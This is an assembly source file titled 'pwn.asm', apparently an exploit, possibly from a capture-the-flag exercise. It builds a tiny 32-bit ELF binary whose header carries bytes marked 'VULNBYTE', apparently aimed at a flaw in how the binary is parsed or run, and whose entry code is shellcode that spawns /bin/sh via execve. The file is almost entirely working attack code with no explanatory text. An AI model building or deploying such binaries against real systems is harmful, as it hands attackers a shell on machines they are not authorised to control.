 ; create binary with: 
 ; nasm -f bin -o pwn pwn.asm; chmod +x pwn;
 ; credit to this webpage/post for teaching me how to create such a tiny bin:
 ; https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
 BITS 32
  
                org     0x08048000
  
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 1, 1, 1, 17        ; VULNBYTE (0x11)
                db      7                               ; VULNBYTE (0x07)
        times 7 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      0x77                            ;   VULNBYTE (0x77)
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      5                               ;   p_flags
                dd      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr
  
  _start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	push eax
	push 0x68732f2f
	push 0x6e69622f
	lea ecx, [esp]
	push eax
	push ecx
	mov ebx, [esp]
	mov ecx, esp
	mov al, 11
	int 0x80
  filesize      equ     $ - $$
